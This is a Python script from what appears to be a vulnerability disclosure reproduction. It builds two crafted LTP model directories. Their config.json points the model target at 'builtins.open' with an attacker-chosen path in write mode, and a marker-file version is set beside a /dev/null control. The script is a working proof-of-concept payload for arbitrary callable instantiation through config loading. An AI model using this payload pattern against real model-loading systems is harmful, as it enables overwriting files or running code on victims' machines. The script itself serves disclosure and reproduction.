#!/usr/bin/env python3
"""Build the crafted LTP model directories used by this reproduction.

Two directories are produced. Their ``config.json`` files are byte-for-byte
identical except for the single attacker-controlled field ``model.file``:

  model_positive/  model.file = /out/pwned_by_ltp_instantiate   (marker path)
  model_negative/  model.file = /dev/null                       (inert sink)

Neither directory contains a ``.py`` file, a pickle, a native library or any
other executable plugin.  Only plain JSON is shipped.
"""
import hashlib
import json
import os
import shutil

HERE = os.path.dirname(os.path.abspath(__file__))

MARKER_PATH = "/out/pwned_by_ltp_instantiate"
CONTROL_PATH = "/dev/null"


def build(name, target_file):
    """Write <name>/config.json whose model ModuleSpec points at builtins.open."""
    directory = os.path.join(HERE, name)
    shutil.rmtree(directory, ignore_errors=True)
    os.makedirs(directory)

    config = {
        "nerual": True,
        "model": {
            "_ltp_target_": "builtins.open",
            "file": target_file,
            "mode": "w",
        },
    }

    path = os.path.join(directory, "config.json")
    # newline="\n" keeps the bytes identical on Windows and on the Linux
    # reproduction container, so the SHA-256 recorded here is the same hash the
    # screenshots show.
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        json.dump(config, handle, indent=2)
        handle.write("\n")
    return path


def relpath(path):
    return os.path.relpath(path, HERE).replace(os.sep, "/")


def sha256(path):
    digest = hashlib.sha256()
    with open(path, "rb") as handle:
        digest.update(handle.read())
    return digest.hexdigest()


def main():
    positive = build("model_positive", MARKER_PATH)
    negative = build("model_negative", CONTROL_PATH)

    print("=== crafted model directories: plain JSON only, no .py / pickle / plugin ===")
    for path in (positive, negative):
        print(f"\n--- {relpath(path)} ---")
        with open(path, encoding="utf-8") as handle:
            print(handle.read().rstrip())
        print(f"sha256 {sha256(path)}")

    sums = os.path.join(HERE, "SHA256SUMS.txt")
    with open(sums, "w", encoding="utf-8") as handle:
        for path in (positive, negative):
            handle.write(f"{sha256(path)}  {relpath(path)}\n")

    print("\n=== contents of each model directory ===")
    for name in ("model_positive", "model_negative"):
        print(f"{name}/: {', '.join(sorted(os.listdir(os.path.join(HERE, name))))}")
    print("[+] wrote SHA256SUMS.txt")


if __name__ == "__main__":
    main()
